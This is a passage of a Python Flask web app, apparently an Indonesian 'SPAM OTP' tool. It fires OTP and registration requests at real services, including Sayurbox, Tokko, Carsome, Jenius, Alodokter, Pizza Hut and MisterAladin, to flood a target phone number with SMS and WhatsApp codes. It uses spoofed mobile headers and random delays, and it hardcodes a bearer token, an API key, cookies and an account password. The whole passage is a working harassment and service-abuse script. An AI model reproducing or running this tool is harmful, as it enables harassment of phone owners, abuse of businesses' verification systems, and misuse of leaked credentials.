                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Oyo'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 24. Foa
        try:
            response = requests.post(
                'https://foreignadmits.com/api/register-otp-generate-student',
                data={'mobile': f'62{nomor[1:]}', 'countryCode': '+62'},
                timeout=10
            )
            all_results['ForeignAdmits'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['ForeignAdmits'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 25. Sayurbox_wa
        try:
            response = requests.post(
                "https://www.sayurbox.com/graphql/v1?deduplicate=1",
                headers={
                    "Host": "www.sayurbox.com",
                    "content-length": "289",
                    "sec-ch-ua-mobile": "?1",
                    "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-bundle-revision": "6.0",
                    "x-sbox-tenant": "sayurbox",
                    "x-binary-version": "2.2.1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.sayurbox.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "operationName": "generateOTP",
                    "variables": {"destinationType": "whatsapp", "identity": "+62" + nomor},
                    "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
                }),
                timeout=10
            )
            all_results['Sayurbox'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Sayurbox'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 26. Tokko_wa
        try:
            response = requests.post(
                "https://api.tokko.io/graphql",
                headers={
                    "Host": "api.tokko.io",
                    "content-length": "306",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "x-tokko-api-client": "merchant_web",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-tokko-api-client-version": "4.5.1",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://web.lummoshop.com",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://web.lummoshop.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "operationName": "generateOTP",
                    "variables": {
                        "generateOtpInput": {
                            "phoneNumber": "+62" + nomor,
                            "hashCode": "",
                            "channel": "WHATSAPP",
                            "userType": "MERCHANT"
                        }
                    },
                    "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
                }),
                timeout=10
            )
            all_results['Tokko'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Tokko'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 27. Carsome_wa
        try:
            response = requests.post(
                "https://www.carsome.id/website/login/sendSMS",
                headers={
                    "Host": "www.carsome.id",
                    "content-length": "38",
                    "x-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "country": "ID",
                    "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.carsome.id",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.carsome.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({"username": nomor, "optType": 1}),
                timeout=10
            )
            all_results['Carsome'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Carsome'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 28. Jenius
        try:
            response = requests.post(
                "https://api.btpn.com/jenius",
                json.dumps({
                    "query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
                    "variables": {"phone": "+62" + nomor, "language": "id"},
                    "operationName": "registerPhone"
                }),
                headers={
                    "accept": "*/*",
                    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
                    "version": "2.36.1-7565",
                    "accept-language": "id",
                    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
                    "Content-Type": "application/json",
                    "Host": "api.btpn.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
                    "User-Agent": "okhttp/3.12.1"
                },
                timeout=10
            )
            all_results['Jenius'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Jenius'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 29. Alodokter
        try:
            response = requests.post(
                'https://www.alodokter.com/login-with-phone-number',
                headers={
                    'Host': 'www.alodokter.com',
                    'content-length': '33',
                    'x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==',
                    'sec-ch-ua-mobile': '?1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
                    'content-type': 'application/json',
                    'accept': 'application/json',
                    'save-data': 'on',
                    'origin': 'https://www.alodokter.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.alodokter.com/login-alodokter',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
                },
                data=json.dumps({"user": {"phone": "0" + nomor}}),
                timeout=10
            )
            all_results['Alodokter'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['Alodokter'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 30. Pizzahut
        try:
            response = requests.post(
                'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
                headers={
                    'Host': 'api-prod.pizzahut.co.id',
                    'content-length': '157',
                    'x-device-type': 'PC',
                    'sec-ch-ua-mobile': '?1',
                    'x-platform': 'WEBMOBILE',
                    'x-channel': '2',
                    'content-type': 'application/json;charset=UTF-8',
                    'accept': 'application/json',
                    'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
                    'x-lang': 'en',
                    'save-data': 'on',
                    'x-device-id': 'web',
                    'origin': 'https://www.pizzahut.co.id',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.pizzahut.co.id/',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
                },
                data=json.dumps({
                    "email": "aldigg088@gmail.com",
                    "first_name": "Xenzi",
                    "last_name": "Wokwokw",
                    "password": "Aldi++\\/67",
                    "phone": "0" + nomor,
                    "birthday": "2000-01-02"
                }),
                timeout=10
            )
            all_results['PizzaHut'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['PizzaHut'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        time.sleep(random.uniform(0.3, 0.8))
        
        # 31. Misteraladin
        try:
            response = requests.post(
                "https://m.misteraladin.com/api/members/v2/otp/request",
                headers={
                    "Host": "m.misteraladin.com",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                    "x-platform": "mobile-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://m.misteraladin.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.misteraladin.com/account",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "phone_number_country_code": "62",
                    "phone_number": nomor,
                    "type": "register"
                }),
                timeout=10
            )
            all_results['MisterAladin'] = {
                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
                'code': response.status_code,
                'response': response.text[:100] if response.text else ''
            }
        except Exception as e:
            all_results['MisterAladin'] = {'status': 'ERROR', 'error': str(e)[:100]}
        
        # ==================== AKHIR SEMUA API ====================
        
        # Hitung statistik
        total = len(all_results)
        success = sum(1 for r in all_results.values() if r.get('status') == 'SUCCESS')
        failed = sum(1 for r in all_results.values() if r.get('status') == 'FAILED')
        errors = sum(1 for r in all_results.values() if r.get('status') == 'ERROR')
        
        return {
            'status': 'success',
            'message': f'Spam selesai! {success} berhasil, {failed} gagal, {errors} error dari {total} layanan.',
            'total': total,
            'success': success,
            'failed': failed,
            'errors': errors,
            'results': all_results
        }
        
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Terjadi kesalahan: {str(e)}',
            'results': all_results if all_results else {}
        }

# ==================== ROUTE FLASK ====================

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        nomor = request.form.get('phone', '').strip()
        
        # Validasi nomor
        if not nomor:
            return jsonify({'status': 'error', 'message': 'Nomor telepon tidak boleh kosong!'})
        
        # Validasi format
        if not re.match(r'^(62|0)[0-9]{9,13}$', nomor):
            return jsonify({
                'status': 'error', 
                'message': 'Format nomor tidak valid! Gunakan 62xxxxxxxx atau 08xxxxxxxx (10-14 digit)'
            })
        
        # Jalankan spam
        result = jalankan_spam(nomor)
        return jsonify(result)
    
    return render_template('index.html')

if __name__ == '__main__':
    print(f"""
{hijau}========================================
   SPAM OTP TOOLS - WEB VERSION
   {putih}Semua API dari versi CLI dipertahankan
{hijau}========================================
    """)
    print(f"{kuning}Server berjalan di: {biru}http://localhost:5000")
    print(f"{merah}Tekan CTRL+C untuk berhenti{putih}")
    app.run(debug=True, host='0.0.0.0', port=5000)
